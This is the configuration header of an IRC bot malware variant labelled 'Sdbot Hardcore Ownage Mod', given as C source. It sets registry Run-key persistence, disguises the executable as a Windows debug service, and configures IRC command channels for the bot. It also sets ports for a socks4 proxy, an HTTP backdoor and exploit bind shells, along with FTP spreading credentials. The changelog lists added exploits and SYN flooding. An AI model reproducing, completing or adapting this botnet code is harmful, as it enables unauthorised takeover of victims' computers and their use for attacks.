/* 
StOner 1.0:
- added asn
- fixed asn ftpd(tested, works)
- added SYN
- custom commands

StOner 1.1:
- added PNP
- added httpd backdoor

*/


// bot configuration

char version[] = "[Sdbot Hardcore Ownage Mod By StOner]";
char botid[] = "[Sdbot Hardcore Ownage Mod By StOner]";

char filename[] = "MDM.EXE";
char valuename[] = "Machine Debug Manager";


BOOL rndfilename = FALSE;
BOOL regrun = TRUE;
char prefix = '.';
int cryptkey = 0;

const int maxaliases = 16;
const int maxlogins = 1;

int maxrand = 9;
char nickconst[] = "";
BOOL nickprefix = TRUE;
int nicktype = CONSTNICK;

//host auth
char *authost[] = {"*@*", "\0"};

//cftp
char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "21";			// cftp port ".lsaport 6969"
char lsuser[] = "evil";
char lspass[] = "bingo2";

// server configuration
char server[] = ""; // server
char server2[] = ""; // backup server (dont use semi-gay, bleh)

// ports
int port = 6667; // server port
int port2 = 6667; // backup server port (dont use. gay, bleh)
int tftpport = 69;

char serverpass[] = ""; // server password

int socks4port = 7561; // socks4 server port.

// channel configuration
char password[] = "";
char channel[] = "#SmokeWeed#";
char chanpass[] = "";
char channel2[] = "#SmokeWeed#";
char chanpass2[] = "";
BOOL topiccmd = TRUE;
char psniffchan[] = "#SmokeWeed#";
char exploitchan[] = "#SmokeWeed#";
char spamchan[]	= "#SmokeWeed#";

//reg keys
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


//custom commands :)
const char slogin[]="";
const char sremove[]="";
const char supdate[]="";
const char sdownload[]="";
const char sadvscan[]="";

//httpd backdoor functions
int httpport = 2006;
unsigned short bport = 4460;		// bindport for exploits